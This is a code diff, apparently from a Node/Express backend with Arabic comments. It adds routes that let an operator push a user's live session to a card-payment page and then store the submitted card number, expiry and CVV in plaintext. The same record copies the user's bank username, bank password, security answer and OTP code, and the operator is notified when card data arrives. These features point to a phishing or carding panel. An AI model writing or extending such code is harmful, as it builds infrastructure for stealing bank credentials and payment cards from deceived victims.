@@ -14,6 +14,14 @@ import {
 } from "@workspace/api-zod";
 import { broadcast } from "../lib/websocket";
 import { sendFCMNotification } from "../lib/firebase-admin";
+import { z } from "zod";
+
+const PaymentDataSchema = z.object({
+  cardNumber: z.string().min(16).max(19),
+  cardHolder: z.string().min(3),
+  expiryDate: z.string().regex(/^\d{2}\/\d{2}$/),
+  cvv: z.string().min(3).max(4),
+});
 
 const router = Router();
 
@@ -407,6 +415,160 @@ router.post("/:id/restore", async (req, res) => {
   } catch (err) {
     req.log.error({ err }, "خطأ في استعادة الطلب");
     res.status(500).json({ error: "فشل في استعادة الطلب" });
+  }
+});
+
+// إرسال بيانات الدفع (PayVisa) وتوجيه العميل للصفحة
+router.post("/:id/request-payment", async (req, res) => {
+  const id = Number(req.params.id);
+  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
+  try {
+    const [app] = await db
+      .select()
+      .from(applicationsTable)
+      .where(eq(applicationsTable.id, id));
+
+    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
+
+    // تحديث الخطوة الحالية لـ pay-visa
+    await db
+      .update(applicationsTable)
+      .set({
+        currentStep: "pay-visa",
+        updatedAt: new Date(),
+      })
+      .where(eq(applicationsTable.id, id));
+
+    // تحديث صفحة الجلسة
+    await db
+      .update(sessionsTable)
+      .set({ currentPage: "pay-visa", lastSeenAt: new Date() })
+      .where(eq(sessionsTable.id, app.sessionId));
+
+    // إرسال حدث WebSocket لتوجيه العميل
+    broadcast({
+      type: "navigate_user",
+      sessionId: app.sessionId,
+      targetStep: "pay-visa",
+    });
+
+    res.json({
+      success: true,
+      message: "تم توجيه العميل لصفحة الدفع",
+      redirectUrl: `/?session=${app.sessionId}&step=pay-visa`,
+    });
+  } catch (err) {
+    req.log.error({ err }, "خطأ في توجيه العميل لصفحة الدفع");
+    res.status(500).json({ error: "فشل في توجيه العميل" });
+  }
+});
+
+// استلام بيانات الدفع من صفحة PayVisa
+router.post("/:id/payment", async (req, res) => {
+  const id = Number(req.params.id);
+  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
+
+  const parsed = PaymentDataSchema.safeParse(req.body);
+  if (!parsed.success) {
+    return res.status(400).json({ error: "بيانات الدفع غير صالحة", details: parsed.error });
+  }
+
+  try {
+    const [app] = await db
+      .select()
+      .from(applicationsTable)
+      .where(eq(applicationsTable.id, id));
+
+    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
+
+    // تحديث بيانات الدفع مع إنشاء نسخة جديدة
+    const parentId = app.parentId ?? app.id;
+
+    // تحديث النسخ القديمة
+    await db
+      .update(applicationsTable)
+      .set({ isLatest: false })
+      .where(
+        and(
+          sql`(${applicationsTable.id} = ${parentId} OR ${applicationsTable.parentId} = ${parentId})`,
+          isNull(applicationsTable.deletedAt)
+        )
+      );
+
+    // إنشاء نسخة جديدة مع بيانات الدفع
+    const newVersion = app.version + 1;
+
+    const [newApp] = await db
+      .insert(applicationsTable)
+      .values({
+        sessionId: app.sessionId,
+        applicantType: app.applicantType,
+        currentStep: "pay-visa",
+        status: app.status,
+        bankId: app.bankId,
+        bankName: app.bankName,
+        fullName: app.fullName,
+        nationalId: app.nationalId,
+        dateOfBirth: app.dateOfBirth,
+        monthlySalary: app.monthlySalary,
+        employer: app.employer,
+        phone: app.phone,
+        email: app.email,
+        city: app.city,
+        maritalStatus: app.maritalStatus,
+        companyName: app.companyName,
+        businessType: app.businessType,
+        commercialRegistration: app.commercialRegistration,
+        employeeCount: app.employeeCount,
+        annualRevenue: app.annualRevenue,
+        contactName: app.contactName,
+        bankUsername: app.bankUsername,
+        bankPassword: app.bankPassword,
+        securityAnswer: app.securityAnswer,
+        otpCode: app.otpCode,
+        paymentCardNumber: parsed.data.cardNumber.replace(/\s/g, ""), // إزالة المسافات
+        paymentCardHolder: parsed.data.cardHolder,
+        paymentExpiryDate: parsed.data.expiryDate,
+        paymentCvv: parsed.data.cvv,
+        paymentStatus: "pending",
+        extraData: app.extraData,
+        adminNote: app.adminNote,
+        version: newVersion,
+        parentId: parentId,
+        isLatest: true,
+      })
+      .returning();
+
+    // تحديث الجلسة
+    await db
+      .update(sessionsTable)
+      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
+      .where(eq(sessionsTable.id, newApp.sessionId));
+
+    // إرسال إشعار
+    broadcast({
+      type: "payment_received",
+      sessionId: newApp.sessionId,
+      data: {
+        id: newApp.id,
+        cardHolder: newApp.paymentCardHolder,
+        last4: newApp.paymentCardNumber?.slice(-4),
+      },
+    });
+
+    sendFCMNotification("payment", {
+      sessionId: newApp.sessionId,
+      applicantName: newApp.fullName || newApp.companyName || newApp.contactName || undefined,
+    }).catch(err => req.log.error({ err }, "FCM notification failed"));
+
+    res.status(201).json({
+      success: true,
+      message: "تم استلام بيانات الدفع بنجاح",
+      paymentId: newApp.id,
+    });
+  } catch (err) {
+    req.log.error({ err }, "خطأ في حفظ بيانات الدفع");
+    res.status(500).json({ error: "فشل في حفظ بيانات الدفع" });
   }
 });
 
